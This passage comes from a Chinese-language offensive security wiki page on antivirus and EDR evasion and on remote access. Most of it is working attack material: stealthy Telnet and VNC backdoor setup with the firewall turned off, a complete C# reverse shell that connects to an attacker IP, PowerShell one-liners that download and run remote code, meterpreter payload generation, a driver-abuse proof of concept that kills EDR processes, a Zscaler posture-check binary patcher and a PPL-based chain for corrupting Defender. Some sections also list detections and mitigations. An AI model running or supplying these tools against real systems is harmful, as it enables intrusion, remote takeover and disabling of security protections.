另一个做同样事情的工具是 [**avred**](https://github.com/dobin/avred)，它在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供了开放的 web 服务。

### **Telnet Server**

在 Windows10 之前，所有 Windows 都附带一个可以安装的 **Telnet server**（需管理员权限），安装方法为：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使其在系统启动时**启动**并**立即运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口** (隐蔽) 并禁用防火墙:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和 **新创建的** 文件 _**UltraVNC.ini**_ 移动到 **victim** 中

#### **Reverse connection**

The **attacker** 应在其 **host** 上执行二进制 `vncviewer.exe -listen 5900`，以便准备捕获反向 **VNC connection**。然后，在 **victim** 内：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 为保持隐蔽性，切勿执行以下操作

- 不要在 winvnc 已在运行时启动 `winvnc`，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。用 `tasklist | findstr winvnc` 检查是否正在运行
- 不要在目录中没有 `UltraVNC.ini` 的情况下启动 `winvnc`，否则会导致 [the config window](https://i.imgur.com/rfMQWcf.png) 打开
- 不要运行 `winvnc -h` 获取帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
深入 GreatSCT：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在 **启动 lister**，使用 `msfconsole -r file.rc`，并 **执行** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前防护程序会非常快地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与其一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表： [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型控制台工具在投放勒索软件之前禁用终端防护。该工具携带其 **自带的易受攻击但已签名驱动**，并滥用它来发出有特权的内核操作，即使是 Protected-Process-Light (PPL) 的 AV 服务也无法阻止。

关键要点
1. **已签名驱动**：写入磁盘的文件是 `ServiceMouse.sys`，但二进制实际上是来自 Antiy Labs “System In-Depth Analysis Toolkit” 的合法签名驱动 `AToolsKrnl64.sys`。因为该驱动带有有效的 Microsoft 签名，即使启用了 Driver-Signature-Enforcement (DSE) 也会被加载。
2. **服务安装**：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将该驱动注册为 **kernel service**，第二行启动它，使 `\\.\ServiceMouse` 可从用户态访问。
3. **驱动暴露的 IOCTLs**
| IOCTL code | 能力 |
|-----------:|------|
| `0x99000050` | 通过 PID 终止任意进程（用于终止 Defender/EDR 服务） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除服务 |

最小 C 概念证明：
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **为什么可行**：BYOVD 完全绕过用户模式防护；在内核执行的代码可以打开 *protected* 进程、终止它们或篡改内核对象，而不受 PPL/PP、ELAM 或其他加固功能的限制。

检测 / 缓解
• 启用 Microsoft 的 vulnerable-driver block list（`HVCI`, `Smart App Control`）以使 Windows 拒绝加载 `AToolsKrnl64.sys`。  
• 监控新 *kernel* 服务的创建，并在驱动从可被全体写入的目录加载或不在允许列表时发出告警。  
• 监视对自定义 device 对象的用户态句柄随后发出的可疑 `DeviceIoControl` 调用。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler 的 **Client Connector** 在本地应用 device-posture 规则，并依赖 Windows RPC 将结果与其他组件通信。两个设计上的薄弱点使得完全绕过成为可能：

1. Posture 评估完全在 **客户端** 进行（只向服务器发送一个布尔值）。  
2. 内部 RPC 端点仅验证连接的可执行文件是否由 Zscaler 签名（通过 `WinVerifyTrust`）。

通过 **修补磁盘上的四个已签名二进制文件**，这两种机制都可以被中和：

| Binary | 被修改的原始逻辑 | 结果 |
|--------|------------------|------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次检查都被视为合规 |
| `ZSAService.exe` | 间接调用 `WinVerifyTrust` | 被 NOP 替换 ⇒ 任何（甚至未签名的）进程都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 被替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 对 tunnel 的完整性检查 | 被短路处理 |

最小 patcher 摘要：
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
替换原始文件并重启服务栈后：

* **所有** 姿态检查显示 **绿色/合规**。
* 未签名或被修改的二进制可以打开命名管道 RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被攻陷的主机能够不受限制地访问由 Zscaler 策略定义的内部网络。

本案例展示了如何通过少量字节补丁绕过纯客户端信任决策和简单签名检查。

## 利用 Protected Process Light (PPL) 和 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 实施签名者/级别层级，只有相同或更高级别的受保护进程才能相互篡改。从进攻角度看，如果你能合法启动一个启用 PPL 的二进制并控制其参数，就可以将良性功能（例如日志记录）转换为一个受限的、由 PPL 支持的写原语，针对 AV/EDR 使用的受保护目录。

What makes a process run as PPL
- 目标 EXE（及任何加载的 DLLs）必须使用支持 PPL 的 EKU 签名。
- 该进程必须使用 CreateProcess 创建，并带有以下标志：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与二进制签名者相匹配的兼容保护级别（例如，对防恶意软件签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，对 Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。错误的级别将在创建时失败。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

启动工具
- 开源辅助工具：CreateProcessAsPPL（选择保护级别并将参数转发到目标 EXE）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用模式：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自我派生进程，并接受一个参数，将日志文件写入调用者指定的路径。
- 当以 PPL 进程启动时，文件写入会带有 PPL 支持。
- ClipUp 无法解析包含空格的路径；在指向通常受保护的位置时使用 8.3 短路径。

8.3 short path helpers
- 列出短名称：在每个父目录中运行 `dir /x`。
- 在 cmd 中推导短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用一个 launcher（例如 CreateProcessAsPPL）用 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN (ClipUp)。
2) 将 ClipUp 的 log-path 参数传递给它，以强制在受保护的 AV 目录中创建文件（例如 Defender Platform）。如有需要，使用 8.3 短名称。
3) 如果目标二进制文件在运行时通常被 AV 打开/锁定（例如 MsMpEng.exe），通过安装一个能更早可靠运行的自动启动服务，在 AV 启动前安排在启动时写入。使用 Process Monitor（boot logging）验证启动顺序。
4) 重启后，带有 PPL 支持的写入会在 AV 锁定其二进制文件之前发生，导致目标文件损坏并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事项和限制
- 你无法控制 ClipUp 写入内容的具体内容，除了放置位置；该 primitive 更适合用于破坏而非精确的内容注入。
- 需要本地 admin/SYSTEM 权限来安装/启动服务，并需要一次重启窗口。
- 时序至关重要：目标必须未被打开；引导时执行可以避免文件锁定。

检测
- Process creation of `ClipUp.exe` with unusual arguments, especially parented by non-standard launchers, around boot.
- New services configured to auto-start suspicious binaries and consistently starting before Defender/AV. Investigate service creation/modification prior to Defender startup failures.
- File integrity monitoring on Defender binaries/Platform directories; unexpected file creations/modifications by processes with protected-process flags.
- ETW/EDR telemetry: look for processes created with `CREATE_PROTECTED_PROCESS` and anomalous PPL level usage by non-AV binaries.

缓解措施
- WDAC/Code Integrity：限制哪些签名二进制可以作为 PPL 运行以及它们的父进程；阻止 ClipUp 在非合法上下文中的调用。
- 服务管理：限制自动启动服务的创建/修改并监控启动顺序被篡改的情况。
- 确保启用 Defender tamper protection 和 early-launch protections；调查指示二进制被篡改的启动错误。
- 如果与环境兼容，考虑在承载安全工具的卷上禁用 8.3 short-name 生成（请充分测试）。

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## 参考资料

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
